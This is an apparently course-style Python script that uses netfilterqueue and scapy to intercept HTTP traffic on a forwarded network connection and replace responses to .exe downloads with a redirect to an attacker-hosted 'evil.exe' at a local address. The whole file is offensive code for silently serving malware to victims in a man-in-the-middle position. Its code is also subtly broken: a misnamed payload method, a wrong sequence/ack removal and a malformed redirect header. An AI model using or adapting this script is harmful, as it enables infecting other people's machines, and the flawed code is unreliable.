#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# list of TCP layers of requests with no response yet
ack_list = []


# @ Requires a packet and a string
# @ ensures delete the line, the checksums et set the load part of the packet
# (each device is qualified by a dictionary including its ip and mac address)
# @ raises nothing
def set_load(packet, load):
    packet[scapy.raw].load = load
    # del this to be calculated anew
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    # scapy convert the package into a scapy packet and we will able to interact with it
    # get_payloads adds the content of the packets on the screen
    scapy_packet = scapy.IP(packet.get_payloads)
    # HTTP data is in the raw layer
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet.show())
        # port 80 equal web
        # dport for request
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            # search raw that contain b".exe" (byte string) and print them
            if b".exe" in scapy_packet[scapy.Raw].load:
                # exe Request add to the list
                ack_list.append(scapy_packet[scapy.TCP].ack)
        # sport for response
        elif scapy_packet[scapy.TCP].sport == 80:
            # HTTP Response if there is already the request in the list
            if scapy_packet[scapy.TCP].seq in ack_list:
                # remove the request from the list becouse we have the response
                ack_list.remove(scapy_packet[scapy.TCP].ack)
                print("[+] replacing file")

                # it downloads Wenstrup instead of the .exe the user wanted (mdf_pck = modified packet)
                # we can put web url or local web url (here is local web url)
                mdf_pck = set_load(scapy_packet, "HTTP/1.1 301 Permanently: http://10.0.2.16/evil-files/evil.exe\n\n")

                # set packet
                packet.set_payload(str(mdf_pck))

        # we accept the packet modify
        packet.accept()  # forward the packet to the destination


# create an instance of a net filter queue objet
queue = netfilterqueue.NetfilterQueue()
# connect this object with the queue that we create (iptables -I FORWARD -j NFQUEUE --gueue-num 0)
# 0 because we used number 0 for the queue
# with a callback function to execute on each packet that will be trapped in this queue right
queue.bind(0, process_packet)
# run the queue
queue.run()
